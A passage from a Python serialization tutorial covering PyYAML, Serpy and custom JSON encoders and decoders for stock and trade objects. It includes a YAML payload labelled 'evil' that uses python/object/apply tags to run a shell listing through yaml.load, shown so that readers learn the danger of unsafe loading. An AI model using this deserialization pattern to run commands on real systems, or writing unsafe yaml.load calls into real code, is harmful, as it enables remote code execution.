Fortunately, we can use the 3rd party library, `pyyaml` to do this for us.

Again, I'm only going to show you a tiny bit of this library, and you can read more about it here:
https://pyyaml.org/wiki/PyYAMLDocumentation

(It's definitely less of a learning curve than Marshmallow!!)

#### Caution
When you load a yaml file using pyyaml, be careful - like pickling it can actually call out to Python functions - so do not load untrusted YAML files using `pyyaml`!


```
import yaml
```


```
data = '''
---
title: Parrot Sketch
year: 1989
actors:
    - first_name: John
      last_name: Cleese
      dob: 1939-10-27
    - first_name: Michael
      last_name: Palin
      dob: 1943-05-05
'''
```


```
d = yaml.load(data)
```


```
type(d)
```




    dict




```
from pprint import pprint

pprint(d)
```

    {'actors': [{'dob': datetime.date(1939, 10, 27),
                 'first_name': 'John',
                 'last_name': 'Cleese'},
                {'dob': datetime.date(1943, 5, 5),
                 'first_name': 'Michael',
                 'last_name': 'Palin'}],
     'title': 'Parrot Sketch',
     'year': 1989}
    

You'll notice that unlike the built-in JSON parser, PyYAML was able to automatically deduce the `date` type in our YAML, as well of course as strings and integers.

Of course, serialization works the same way:


```
d = {'a': 100, 'b': False, 'c': 10.5, 'd': [1, 2, 3]}
```


```
print(yaml.dump(d))
```

    a: 100
    b: false
    c: 10.5
    d: [1, 2, 3]
    
    

You'll notice in the above example that the list was represented using `[1, 2, 3]` - this is valid YAML as well, and is equivalent to this notation:

```
d:
    - 1
    - 2
    - 3
```

If you prefer this block style, you can force it this way:


```
print(yaml.dump(d, default_flow_style=False))
```

    a: 100
    b: false
    c: 10.5
    d:
    - 1
    - 2
    - 3
    
    

What's interesting about PyYAML is that it can also automatically serialize and deserialize complex objects:


```
class Person:
    def __init__(self, name, dob):
        self.name = name
        self.dob = dob
        
    def __repr__(self):
        return f'Person(name={self.name}, dob={self.dob})'
```


```
from datetime import date

p1 = Person('John Cleese', date(1939, 10, 27))
p2 = Person('Michael Palin', date(1934, 5, 5))
```


```
print(yaml.dump({'john': p1, 'michael': p2}))
```

    john: !!python/object:__main__.Person {dob: 1939-10-27, name: John Cleese}
    michael: !!python/object:__main__.Person {dob: 1934-05-05, name: Michael Palin}
    
    

Notice that weird looking syntax? It's actually useful when we deserialize the YAML string - of course it means we must have a `Person` class defined with the appropriate init method.


```
yaml_data = '''
john: !!python/object:__main__.Person 
    dob: 1939-10-27
    name: John Cleese
michael: !!python/object:__main__.Person 
    dob: 1934-05-05
    name: Michael Palin
'''
```


```
d = yaml.load(yaml_data)
```


```
d
```




    {'john': Person(name=John Cleese, dob=1939-10-27),
     'michael': Person(name=Michael Palin, dob=1934-05-05)}



As you can see, `john` and `michael` were deserialized into `Person` type objects.

This is why you have to be quite careful with the source of any YAML you deserialize.

Here's an evil example:


```
yaml_data = '''
exec_paths: 
    !!python/object/apply:os.get_exec_path []
exec_command:
    !!python/object/apply:subprocess.check_output [['ls', '/']]
'''
```


```
yaml.load(yaml_data)
```




    {'exec_paths': ['/Users/fbaptiste/anaconda3/envs/deepdive/bin',
      '/Users/fbaptiste/anaconda3/envs/deepdive/bin',
      '/Users/fbaptiste/anaconda3/bin',
      '/usr/local/bin',
      '/usr/bin',
      '/bin',
      '/usr/sbin',
      '/sbin'],
     'exec_command': b'Applications\nLibrary\nNetwork\nSystem\nUsers\nVolumes\nbin\ncores\ndev\netc\nhome\ninstaller.failurerequests\nnet\nprivate\nsbin\ntmp\nusr\nvar\n'}



So, be very careful with `load`. In general it is safer practice to use the `safe_load` method instead, but you will lose the ability to deserialize into custom Python objects, unless you override that behavior. You can always use Marshmallow to do that secondary step in a safer way.


```
yaml.safe_load(yaml_data)
```


    ---------------------------------------------------------------------------

    ConstructorError                          Traceback (most recent call last)

    <ipython-input-17-a4c68930d90a> in <module>
    ----> 1 yaml.safe_load(yaml_data)
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/yaml/__init__.py in safe_load(stream)
         92     Resolve only basic YAML tags.
         93     """
    ---> 94     return load(stream, SafeLoader)
         95 
         96 def safe_load_all(stream):
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/yaml/__init__.py in load(stream, Loader)
         70     loader = Loader(stream)
         71     try:
    ---> 72         return loader.get_single_data()
         73     finally:
         74         loader.dispose()
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/yaml/constructor.py in get_single_data(self)
         35         node = self.get_single_node()
         36         if node is not None:
    ---> 37             return self.construct_document(node)
         38         return None
         39 
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/yaml/constructor.py in construct_document(self, node)
         44             self.state_generators = []
         45             for generator in state_generators:
    ---> 46                 for dummy in generator:
         47                     pass
         48         self.constructed_objects = {}
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/yaml/constructor.py in construct_yaml_map(self, node)
        396         data = {}
        397         yield data
    --> 398         value = self.construct_mapping(node)
        399         data.update(value)
        400 
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/yaml/constructor.py in construct_mapping(self, node, deep)
        202         if isinstance(node, MappingNode):
        203             self.flatten_mapping(node)
    --> 204         return super().construct_mapping(node, deep=deep)
        205 
        206     def construct_yaml_null(self, node):
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/yaml/constructor.py in construct_mapping(self, node, deep)
        127                 raise ConstructorError("while constructing a mapping", node.start_mark,
        128                         "found unhashable key", key_node.start_mark)
    --> 129             value = self.construct_object(value_node, deep=deep)
        130             mapping[key] = value
        131         return mapping
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/yaml/constructor.py in construct_object(self, node, deep)
         84                     constructor = self.__class__.construct_mapping
         85         if tag_suffix is None:
    ---> 86             data = constructor(self, node)
         87         else:
         88             data = constructor(self, tag_suffix, node)
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/yaml/constructor.py in construct_undefined(self, node)
        412         raise ConstructorError(None, None,
        413                 "could not determine a constructor for the tag %r" % node.tag,
    --> 414                 node.start_mark)
        415 
        416 SafeConstructor.add_constructor(
    

    ConstructorError: could not determine a constructor for the tag 'tag:yaml.org,2002:python/object/apply:os.get_exec_path'
      in "<unicode string>", line 3, column 5:
            !!python/object/apply:os.get_exe ... 
            ^


To override and allow certain Python objects to be deserialized in `safe_load` we can proceed this way.

Firstly we are going to simplify the object tag notation by customizing it in our `Person` class, and we are also going to make our object as safe to be deserialized. Our `Person` class will now have to inherit from the `yaml.YAMLObject`:


```
from yaml import YAMLObject, SafeLoader

class Person(YAMLObject):
    yaml_tag = '!Person'
    
    def __init__(self, name, age):
        self.name = name
        self.age = age
        
    def __repr__(self):
        return f'Person(name={self.name}, age={self.age})'
```

First let's see how objects are now serialized:


```
yaml.dump(dict(john=Person('John Cleese', 79),
               michael=Person('Michael Palin', 74)))
```




    'john: !Person {age: 79, name: John Cleese}\nmichael: !Person {age: 74, name: Michael Palin}\n'



As you can see we have a slightly cleaner syntax.

Now let's try to load the serialized version:


```
yaml_data = '''
john: !Person
    name: John Cleese
    age: 79
michael: !Person
    name: Michael Palin
    age: 74
'''
```


```
yaml.load(yaml_data)
```




    {'john': Person(name=John Cleese, age=79),
     'michael': Person(name=Michael Palin, age=74)}



And `safe_load`:


```
yaml.safe_load(yaml_data)
```


    ---------------------------------------------------------------------------

    ConstructorError                          Traceback (most recent call last)

    <ipython-input-22-a4c68930d90a> in <module>
    ----> 1 yaml.safe_load(yaml_data)
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/yaml/__init__.py in safe_load(stream)
         92     Resolve only basic YAML tags.
         93     """
    ---> 94     return load(stream, SafeLoader)
         95 
         96 def safe_load_all(stream):
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/yaml/__init__.py in load(stream, Loader)
         70     loader = Loader(stream)
         71     try:
    ---> 72         return loader.get_single_data()
         73     finally:
         74         loader.dispose()
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/yaml/constructor.py in get_single_data(self)
         35         node = self.get_single_node()
         36         if node is not None:
    ---> 37             return self.construct_document(node)
         38         return None
         39 
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/yaml/constructor.py in construct_document(self, node)
         44             self.state_generators = []
         45             for generator in state_generators:
    ---> 46                 for dummy in generator:
         47                     pass
         48         self.constructed_objects = {}
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/yaml/constructor.py in construct_yaml_map(self, node)
        396         data = {}
        397         yield data
    --> 398         value = self.construct_mapping(node)
        399         data.update(value)
        400 
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/yaml/constructor.py in construct_mapping(self, node, deep)
        202         if isinstance(node, MappingNode):
        203             self.flatten_mapping(node)
    --> 204         return super().construct_mapping(node, deep=deep)
        205 
        206     def construct_yaml_null(self, node):
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/yaml/constructor.py in construct_mapping(self, node, deep)
        127                 raise ConstructorError("while constructing a mapping", node.start_mark,
        128                         "found unhashable key", key_node.start_mark)
    --> 129             value = self.construct_object(value_node, deep=deep)
        130             mapping[key] = value
        131         return mapping
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/yaml/constructor.py in construct_object(self, node, deep)
         84                     constructor = self.__class__.construct_mapping
         85         if tag_suffix is None:
    ---> 86             data = constructor(self, node)
         87         else:
         88             data = constructor(self, tag_suffix, node)
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/yaml/constructor.py in construct_undefined(self, node)
        412         raise ConstructorError(None, None,
        413                 "could not determine a constructor for the tag %r" % node.tag,
    --> 414                 node.start_mark)
        415 
        416 SafeConstructor.add_constructor(
    

    ConstructorError: could not determine a constructor for the tag '!Person'
      in "<unicode string>", line 2, column 7:
        john: !Person
              ^


So now let's mark our `Person` object as safe:


```
class Person(YAMLObject):
    yaml_tag = '!Person'
    yaml_loader = SafeLoader
    
    def __init__(self, name, age):
        self.name = name
        self.age = age
        
    def __repr__(self):
        return f'Person(name={self.name}, age={self.age})'
```


```
yaml.safe_load(yaml_data)
```




    {'john': Person(name=John Cleese, age=79),
     'michael': Person(name=Michael Palin, age=74)}



And as you can see, the deserializtion now works for the `Person` class.

There's a lot more this library can do, so look at the reference if you want to use YAML. 

Also, as I mentionmed before, you can combine this with `Marshmallow` for example to get to a full marshalling solution to complex (custom) Python types.

##  Serpy

If you're just looking for deserialization, then `Serpy` might work for you. It is extremely fast, but only provides serialization.

You can read more about Serpy here: https://serpy.readthedocs.io/en/latest/

Here's a simple example first, using our goto Person object.


```
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
        
    def __repr__(self):
        return f'Person(name={self.name}, age={self.age})'
```


```
import serpy
```

Very similarly to `Marshmallow` we need to define a schema for the serialization - Serpy calls those objects serializers:


```
class PersonSerializer(serpy.Serializer):
    name = serpy.StrField()
    age = serpy.IntField()
```


```
p1 = Person('Michael Palin', 75)
```


```
PersonSerializer(p1).data
```




    {'name': 'Michael Palin', 'age': 75}



Of course, we can get more complex schemas defined.

Let's implement a schema for our `Movie` example we did in a previous video on Marshmallow.


```
class Movie:
    def __init__(self, title, year, actors):
        self.title = title
        self.year = year
        self.actors = actors
```


```
class MovieSerializer(serpy.Serializer):
    title = serpy.StrField()
    year = serpy.IntField()
    actors = PersonSerializer(many=True)
```


```
p2 = Person('John Cleese', 79)
```


```
movie = Movie('Parrot Sketch', 1989, [p1, p2])
```


```
movie.title, movie.year, movie.actors
```




    ('Parrot Sketch',
     1989,
     [Person(name=Michael Palin, age=75), Person(name=John Cleese, age=79)])




```
MovieSerializer(movie).data
```




    {'title': 'Parrot Sketch',
     'year': 1989,
     'actors': [{'name': 'Michael Palin', 'age': 75},
      {'name': 'John Cleese', 'age': 79}]}



Note that the result of serialization is to a basic Python dictionary, and you can takes this further to JSON or YAML using the standard library `json` module or `PyYaml`.

For example:


```
import json
import yaml
```


```
json.dumps(MovieSerializer(movie).data)
```




    '{"title": "Parrot Sketch", "year": 1989, "actors": [{"name": "Michael Palin", "age": 75}, {"name": "John Cleese", "age": 79}]}'




```
print(yaml.dump(MovieSerializer(movie).data, 
          default_flow_style=False))
```

    actors:
    - age: 75
      name: Michael Palin
    - age: 79
      name: John Cleese
    title: Parrot Sketch
    year: 1989
    
    

# Section 08 - Coding Exercises

##  Coding Exercises

Consider the following classes:


```
class Stock:
    def __init__(self, symbol, date, open_, high, low, close, volume):
        self.symbol = symbol
        self.date = date
        self.open = open_
        self.high = high
        self.low = low
        self.close = close
        self.volume = volume
        
class Trade:
    def __init__(self, symbol, timestamp, order, price, volume, commission):
        self.symbol = symbol
        self.timestamp = timestamp
        self.order = order
        self.price = price
        self.commission = commission
        self.volume = volume
```

#### Exercise 1

Given the above class, write a custom `JSONEncoder` class to **serialize** dictionaries that contain instances of these particular classes. Keep in mind that you will want to deserialize the data too - so you will need some technique to indicate the object type in your serialization.

For example you may have an object such as this one that needs to be serialized:


```
from datetime import date, datetime
from decimal import Decimal

activity = {
    "quotes": [
        Stock('TSLA', date(2018, 11, 22), 
              Decimal('338.19'), Decimal('338.64'), Decimal('337.60'), Decimal('338.19'), 365_607),
        Stock('AAPL', date(2018, 11, 22), 
              Decimal('176.66'), Decimal('177.25'), Decimal('176.64'), Decimal('176.78'), 3_699_184),
        Stock('MSFT', date(2018, 11, 22), 
              Decimal('103.25'), Decimal('103.48'), Decimal('103.07'), Decimal('103.11'), 4_493_689)
    ],
    
    "trades": [
        Trade('TSLA', datetime(2018, 11, 22, 10, 5, 12), 'buy', Decimal('338.25'), 100, Decimal('9.99')),
        Trade('AAPL', datetime(2018, 11, 22, 10, 30, 5), 'sell', Decimal('177.01'), 20, Decimal('9.99'))
    ]
}
```

Hint: You can modify the classes if you need to.

#### Exercise 2

Write code to reverse the serialization you just created. Write a custom decoder that can deserialize a JSON structure containing `Stock` and `Trade` objects. 

#### Exercise 3

Do the same serialization and deserialization, but using `Marshmallow`.

##  Exercise 1 - Solution

The first thing I am going to do is add an `as_dict` method to both my classes to make serialization a bit easier:


```
class Stock:
    def __init__(self, symbol, date_, open_, high, low, close, volume):
        self.symbol = symbol
        self.date = date_
        self.open = open_
        self.high = high
        self.low = low
        self.close = close
        self.volume = volume
        
    def as_dict(self):
        return dict(symbol=self.symbol, 
                    date=self.date,
                    open=self.open,
                    high=self.high,
                    low=self.low,
                    close=self.close,
                    volume=self.volume)
        
class Trade:
    def __init__(self, symbol, timestamp, order, price, volume, commission):
        self.symbol = symbol
        self.timestamp = timestamp
        self.order = order
        self.price = price
        self.commission = commission
        self.volume = volume
        
    def as_dict(self):
        return dict(
            symbol=self.symbol,
            timestamp=self.timestamp,
            order=self.order,
            price=self.price,
            volume=self.volume,
            commission=self.commission)
```


```
from datetime import date, datetime
from decimal import Decimal

activity = {
    "quotes": [
        Stock('TSLA', date(2018, 11, 22), 
              Decimal('338.19'), Decimal('338.64'), Decimal('337.60'), Decimal('338.19'), 365_607),
        Stock('AAPL', date(2018, 11, 22), 
              Decimal('176.66'), Decimal('177.25'), Decimal('176.64'), Decimal('176.78'), 3_699_184),
        Stock('MSFT', date(2018, 11, 22), 
              Decimal('103.25'), Decimal('103.48'), Decimal('103.07'), Decimal('103.11'), 4_493_689)
    ],
    
    "trades": [
        Trade('TSLA', datetime(2018, 11, 22, 10, 5, 12), 'buy', Decimal('338.25'), 100, Decimal('9.99')),
        Trade('AAPL', datetime(2018, 11, 22, 10, 30, 5), 'sell', Decimal('177.01'), 20, Decimal('9.99'))
    ]
}
```

My approach is going to be to serialize these classes using a special class name identifier.

For example to serialize `Stock` objects I will use this format:

```
{
    "object": "Stock",
    "symbol": "...",
    ...
}
```

Similarly for a `Trade` objects.

Furthermore, I need to pay special attention to dates, timestamps and prices.

For dates and timestamps I will use the standard ISO format (`YYYY-MM-DD` and `YYYY-MM-DDTHH:MM:SS`).

Prices are stored in `Decimal` objects - so we'll have to handle serialization for those objects too.


```
from json import JSONEncoder, dumps

class CustomEncoder(JSONEncoder):
    def default(self, obj):
        if isinstance(obj, Stock):
            return obj.as_dict()
        elif isinstance(obj, Trade):
            return obj_as_dict()
        else:
            super().default(obj)
```

This will not work quite yet - we are not handling decimal, date and datetime serialization:


```
dumps(activity, cls=CustomEncoder)
```


    ---------------------------------------------------------------------------

    TypeError                                 Traceback (most recent call last)

    <ipython-input-4-43e91b3b7717> in <module>
    ----> 1 dumps(activity, cls=CustomEncoder)
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/__init__.py in dumps(obj, skipkeys, ensure_ascii, check_circular, allow_nan, cls, indent, separators, default, sort_keys, **kw)
        236         check_circular=check_circular, allow_nan=allow_nan, indent=indent,
        237         separators=separators, default=default, sort_keys=sort_keys,
    --> 238         **kw).encode(obj)
        239 
        240 
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/encoder.py in encode(self, o)
        197         # exceptions aren't as detailed.  The list call should be roughly
        198         # equivalent to the PySequence_Fast that ''.join() would do.
    --> 199         chunks = self.iterencode(o, _one_shot=True)
        200         if not isinstance(chunks, (list, tuple)):
        201             chunks = list(chunks)
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/encoder.py in iterencode(self, o, _one_shot)
        255                 self.key_separator, self.item_separator, self.sort_keys,
        256                 self.skipkeys, _one_shot)
    --> 257         return _iterencode(o, 0)
        258 
        259 def _make_iterencode(markers, _default, _encoder, _indent, _floatstr,
    

    <ipython-input-3-e681e72edf6d> in default(self, obj)
          8             return obj_as_dict()
          9         else:
    ---> 10             super().default(obj)
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/encoder.py in default(self, o)
        178         """
        179         raise TypeError("Object of type '%s' is not JSON serializable" %
    --> 180                         o.__class__.__name__)
        181 
        182     def encode(self, o):
    

    TypeError: Object of type 'date' is not JSON serializable


There's a few ways we can fix that - we could serialize by coding the date formatting directly in the `Trade` or `Stock` serializers:


```
from json import JSONEncoder, dumps

class CustomEncoder(JSONEncoder):
    def default(self, obj):
        if isinstance(obj, Stock):
            result = obj.as_dict()
            result['date'] = result['date'].strftime('%Y-%m-%d')
            return result
        elif isinstance(obj, Trade):
            result = obj.as_dict()
            result['timestamp'] = result['timestamp'].strftime('%Y-%m-%dT%H:%M:%S')
            return result
        else:
            super().default(obj)
```

This will still not quite work because we are not handling serizliation of `Decimal` objects. But I would rather not have to handle them the way we are handling `date` and `datetime` objects - that would be very tedious.

In fact, I am going to write handlers for the `Decimal` as well as `date` and `datetime` classes this way:


```
from json import JSONEncoder, dumps

class CustomEncoder(JSONEncoder):
    def default(self, obj):
        if isinstance(obj, Stock) or isinstance(obj, Trade):
            return obj.as_dict()
        elif isinstance(obj, datetime):
            # check for datetime first, because a datetime is also a date
            return obj.strftime('%Y-%m-%dT%H:%M:%S')
        elif isinstance(obj, date):
            return obj.strftime('%Y-%m-%d')
        elif isinstance(obj, Decimal):
            return str(obj)
        else:
            super().default(obj)
```


```
encoded = dumps(activity, cls=CustomEncoder, indent=2)
```


```
print(encoded)
```

    {
      "quotes": [
        {
          "symbol": "TSLA",
          "date": "2018-11-22",
          "open": "338.19",
          "high": "338.64",
          "low": "337.60",
          "close": "338.19",
          "volume": 365607
        },
        {
          "symbol": "AAPL",
          "date": "2018-11-22",
          "open": "176.66",
          "high": "177.25",
          "low": "176.64",
          "close": "176.78",
          "volume": 3699184
        },
        {
          "symbol": "MSFT",
          "date": "2018-11-22",
          "open": "103.25",
          "high": "103.48",
          "low": "103.07",
          "close": "103.11",
          "volume": 4493689
        }
      ],
      "trades": [
        {
          "symbol": "TSLA",
          "timestamp": "2018-11-22T10:05:12",
          "order": "buy",
          "price": "338.25",
          "volume": 100,
          "commission": "9.99"
        },
        {
          "symbol": "AAPL",
          "timestamp": "2018-11-22T10:30:05",
          "order": "sell",
          "price": "177.01",
          "volume": 20,
          "commission": "9.99"
        }
      ]
    }
    

We're almost there - the serialization works just fine, but if I'm going to deserialize the objects later, I will need to know what the object type is for the `Trade` and `Stock` objects. We could add it to the `as_dict` methods of each class, but I don't necessarily want it all the time - so instead I am going to inject the class name during the serialization:


```
class CustomEncoder(JSONEncoder):
    def default(self, obj):
        if isinstance(obj, Stock) or isinstance(obj, Trade):
            result =  obj.as_dict()
            result['object'] = obj.__class__.__name__
            return result
        elif isinstance(obj, datetime):
            return obj.strftime('%Y-%m-%dT%H:%M:%S')
        elif isinstance(obj, date):
            return obj.strftime('%Y-%m-%d')
        elif isinstance(obj, Decimal):
            return str(obj)
        else:
            super().default(obj)
```


```
result = dumps(activity, cls=CustomEncoder, indent=2)
print(result)
```

    {
      "quotes": [
        {
          "symbol": "TSLA",
          "date": "2018-11-22",
          "open": "338.19",
          "high": "338.64",
          "low": "337.60",
          "close": "338.19",
          "volume": 365607,
          "object": "Stock"
        },
        {
          "symbol": "AAPL",
          "date": "2018-11-22",
          "open": "176.66",
          "high": "177.25",
          "low": "176.64",
          "close": "176.78",
          "volume": 3699184,
          "object": "Stock"
        },
        {
          "symbol": "MSFT",
          "date": "2018-11-22",
          "open": "103.25",
          "high": "103.48",
          "low": "103.07",
          "close": "103.11",
          "volume": 4493689,
          "object": "Stock"
        }
      ],
      "trades": [
        {
          "symbol": "TSLA",
          "timestamp": "2018-11-22T10:05:12",
          "order": "buy",
          "price": "338.25",
          "volume": 100,
          "commission": "9.99",
          "object": "Trade"
        },
        {
          "symbol": "AAPL",
          "timestamp": "2018-11-22T10:30:05",
          "order": "sell",
          "price": "177.01",
          "volume": 20,
          "commission": "9.99",
          "object": "Trade"
        }
      ]
    }
    

##  Exercise 2 - Solution

Here's where we ended up after completing Exercise 1:


```
from json import JSONEncoder, dumps
from datetime import date, datetime
from decimal import Decimal

class CustomEncoder(JSONEncoder):
    def default(self, obj):
        if isinstance(obj, Stock) or isinstance(obj, Trade):
            result =  obj.as_dict()
            result['object'] = obj.__class__.__name__
            return result
        elif isinstance(obj, datetime):
            return obj.strftime('%Y-%m-%dT%H:%M:%S')
        elif isinstance(obj, date):
            return obj.strftime('%Y-%m-%d')
        elif isinstance(obj, Decimal):
            return str(obj)
        else:
            super().default(obj)
```


```
class Stock:
    def __init__(self, symbol, date_, open_, high, low, close, volume):
        self.symbol = symbol
        self.date = date_
        self.open = open_
        self.high = high
        self.low = low
        self.close = close
        self.volume = volume
        
    def as_dict(self):
        return dict(symbol=self.symbol, 
                    date=self.date,
                    open=self.open,
                    high=self.high,
                    low=self.low,
                    close=self.close,
                    volume=self.volume)
        
class Trade:
    def __init__(self, symbol, timestamp, order, price, volume, commission):
        self.symbol = symbol
        self.timestamp = timestamp
        self.order = order
        self.price = price
        self.commission = commission
        self.volume = volume
        
    def as_dict(self):
        return dict(
            symbol=self.symbol,
            timestamp=self.timestamp,
            order=self.order,
            price=self.price,
            volume=self.volume,
            commission=self.commission)
```


```
activity = {
    "quotes": [
        Stock('TSLA', date(2018, 11, 22), 
              Decimal('338.19'), Decimal('338.64'), Decimal('337.60'), Decimal('338.19'), 365_607),
        Stock('AAPL', date(2018, 11, 22), 
              Decimal('176.66'), Decimal('177.25'), Decimal('176.64'), Decimal('176.78'), 3_699_184),
        Stock('MSFT', date(2018, 11, 22), 
              Decimal('103.25'), Decimal('103.48'), Decimal('103.07'), Decimal('103.11'), 4_493_689)
    ],
    
    "trades": [
        Trade('TSLA', datetime(2018, 11, 22, 10, 5, 12), 'buy', Decimal('338.25'), 100, Decimal('9.99')),
        Trade('AAPL', datetime(2018, 11, 22, 10, 30, 5), 'sell', Decimal('177.01'), 20, Decimal('9.99'))
    ]
}
```

And we could serialize our objects:


```
encoded = dumps(activity, cls=CustomEncoder, indent=2)
print(encoded)
```

    {
      "quotes": [
        {
          "symbol": "TSLA",
          "date": "2018-11-22",
          "open": "338.19",
          "high": "338.64",
          "low": "337.60",
          "close": "338.19",
          "volume": 365607,
          "object": "Stock"
        },
        {
          "symbol": "AAPL",
          "date": "2018-11-22",
          "open": "176.66",
          "high": "177.25",
          "low": "176.64",
          "close": "176.78",
          "volume": 3699184,
          "object": "Stock"
        },
        {
          "symbol": "MSFT",
          "date": "2018-11-22",
          "open": "103.25",
          "high": "103.48",
          "low": "103.07",
          "close": "103.11",
          "volume": 4493689,
          "object": "Stock"
        }
      ],
      "trades": [
        {
          "symbol": "TSLA",
          "timestamp": "2018-11-22T10:05:12",
          "order": "buy",
          "price": "338.25",
          "volume": 100,
          "commission": "9.99",
          "object": "Trade"
        },
        {
          "symbol": "AAPL",
          "timestamp": "2018-11-22T10:30:05",
          "order": "sell",
          "price": "177.01",
          "volume": 20,
          "commission": "9.99",
          "object": "Trade"
        }
      ]
    }
    

Now we want to reverse the process and deserialize this JSON object. I am not going to assume any specific schema other than `Stock` and `Trade` objects will contain the `"class": "Stock"` or `"object": "Trade"` entries and the required additional fields to define those objects.

What I want to do is examine each dictionary, and if it contains those entries, I will want to deserialize as the corresponding objects.

We'll need to pay attention also to `date`, `datetime`, and `Decimal` type objects.

Let's start by writing a utility function that will convert a JSON dictionary of each specific type to the corresponding object type:


```
def decode_stock(d):
    # assumes "class": "Stock" is in the dictionary
    # and contains all the required serialized fields needed to re-create the object
    # if working in Python 3.7, we could use date.fromisoformat(d['date']) instead
    s = Stock(d['symbol'], 
              datetime.strptime(d['date'], '%Y-%m-%d').date(), 
              Decimal(d['open']), 
              Decimal(d['high']), 
              Decimal(d['low']), 
              Decimal(d['close']),
              int(d['volume']))
    return s
```

Let's make sure this works:


```
s = decode_stock({
      "symbol": "AAPL",
      "date": "2018-11-22",
      "open": "176.66",
      "high": "177.25",
      "low": "176.64",
      "close": "176.78",
      "volume": 3699184,
      "object": "Stock"
    })
```


```
type(s), vars(s)
```




    (__main__.Stock,
     {'symbol': 'AAPL',
      'date': datetime.date(2018, 11, 22),
      'open': Decimal('176.66'),
      'high': Decimal('177.25'),
      'low': Decimal('176.64'),
      'close': Decimal('176.78'),
      'volume': 3699184})



Now let's do the same thing with a `Trade`:


```
def decode_trade(d):
    # assumes "class": "Trade" is in the dictionary
    # and contains all the required serialized fields needed to re-create the object
    s = Trade(d['symbol'], 
              datetime.strptime(d['timestamp'], '%Y-%m-%dT%H:%M:%S'), 
              d['order'], 
              Decimal(d['price']), 
              int(d['volume']), 
              Decimal(d['commission']))
    return s
```


```
t = decode_trade({
      "symbol": "TSLA",
      "timestamp": "2018-11-22T10:05:12",
      "order": "buy",
      "price": "338.25",
      "volume": 100,
      "commission": "9.99",
      "object": "Trade"
    })
```


```
type(t), vars(t)
```




    (__main__.Trade,
     {'symbol': 'TSLA',
      'timestamp': datetime.datetime(2018, 11, 22, 10, 5, 12),
      'order': 'buy',
      'price': Decimal('338.25'),
      'commission': Decimal('9.99'),
      'volume': 100})



OK, these look good to go, so one last utility function that can take in **either** a `Stock` or `Trade` type JSON object, and decode accordingly:


```
def decode_financials(d):
    object_type = d.get('object', None)
    if object_type == 'Stock':
        return decode_stock(d)
    elif object_type == 'Trade':
        return decode_trade(d)
    return d  
```


```
decode_financials({
      "symbol": "TSLA",
      "timestamp": "2018-11-22T10:05:12",
      "order": "buy",
      "price": "338.25",
      "volume": 100,
      "commission": "9.99",
      "object": "Trade"
    })
```




    <__main__.Trade at 0x10c4dc1d0>




```
decode_financials({
      "symbol": "AAPL",
      "date": "2018-11-22",
      "open": "176.66",
      "high": "177.25",
      "low": "176.64",
      "close": "176.78",
      "volume": 3699184,
      "object": "Stock"
    })
```




    <__main__.Stock at 0x10c4dc588>



So now let's write our custom JSON decoding class:


```
from json import JSONDecoder, loads
```


```
class CustomDecoder(JSONDecoder):
    def decode(self, arg):
        data = loads(arg)
        # now we have to recursively look for `Trade` and `Stock` objects
        return self.parse_financials(data)
 
    def parse_financials(self, obj):
        if isinstance(obj, dict):
            obj = decode_financials(obj)
            if isinstance(obj, dict):
                for key, value in obj.items():
                    obj[key] = self.parse_financials(value)
        elif isinstance(obj, list):
            for index, item in enumerate(obj):
                obj[index] = self.parse_financials(item)
        return obj
```

Let's recall our serialized data first:


```
print(encoded)
```

    {
      "quotes": [
        {
          "symbol": "TSLA",
          "date": "2018-11-22",
          "open": "338.19",
          "high": "338.64",
          "low": "337.60",
          "close": "338.19",
          "volume": 365607,
          "object": "Stock"
        },
        {
          "symbol": "AAPL",
          "date": "2018-11-22",
          "open": "176.66",
          "high": "177.25",
          "low": "176.64",
          "close": "176.78",
          "volume": 3699184,
          "object": "Stock"
        },
        {
          "symbol": "MSFT",
          "date": "2018-11-22",
          "open": "103.25",
          "high": "103.48",
          "low": "103.07",
          "close": "103.11",
          "volume": 4493689,
          "object": "Stock"
        }
      ],
      "trades": [
        {
          "symbol": "TSLA",
          "timestamp": "2018-11-22T10:05:12",
          "order": "buy",
          "price": "338.25",
          "volume": 100,
          "commission": "9.99",
          "object": "Trade"
        },
        {
          "symbol": "AAPL",
          "timestamp": "2018-11-22T10:30:05",
          "order": "sell",
          "price": "177.01",
          "volume": 20,
          "commission": "9.99",
          "object": "Trade"
        }
      ]
    }
    


```
decoded = loads(encoded, cls=CustomDecoder)
```


```
decoded
```




    {'quotes': [<__main__.Stock at 0x10c4df550>,
      <__main__.Stock at 0x10c4b6400>,
      <__main__.Stock at 0x10c4b6be0>],
     'trades': [<__main__.Trade at 0x10c4b6e48>, <__main__.Trade at 0x10c4b6978>]}



How can we check of the two objects are "equal"? The problem is that we did not define equality for `Stock` and `Trade` objects, so we cannot compare two instances of the same class and expect equality even if they have the same data. We need to define that first!
Let's do that:


```
class Stock:
    def __init__(self, symbol, date_, open_, high, low, close, volume):
        self.symbol = symbol
        self.date = date_
        self.open = open_
        self.high = high
        self.low = low
        self.close = close
        self.volume = volume
        
    def as_dict(self):
        return dict(symbol=self.symbol, 
                    date=self.date,
                    open=self.open,
                    high=self.high,
                    low=self.low,
                    close=self.close,
                    volume=self.volume)
    
    def __eq__(self, other):
        return isinstance(other, Stock) and self.as_dict() == other.as_dict()
        
